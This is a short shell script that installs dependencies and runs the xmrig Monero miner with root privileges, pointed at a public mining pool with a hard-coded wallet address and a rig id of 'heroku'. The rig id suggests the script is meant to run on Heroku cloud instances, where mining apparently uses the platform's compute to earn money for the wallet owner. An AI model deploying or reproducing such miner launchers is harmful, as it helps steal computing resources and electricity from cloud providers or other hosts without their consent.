echo "install deps"
sudo apt-get update -y &&sudo apt-get install libhwloc-dev libc6 libc-bin -y

chmod 755 xmrig
sudo ./xmrig -o us-west.minexmr.com:443 -u 45EUJCTJbToDf79PU8YrXxHwAomkXcWapBBGeQSKbb3hJKRbwbbJ8NZ34GQT61qkPEivjq3fk78DxVhmyyZCeSXJ1hw7PQR -k --tls --rig-id heroku
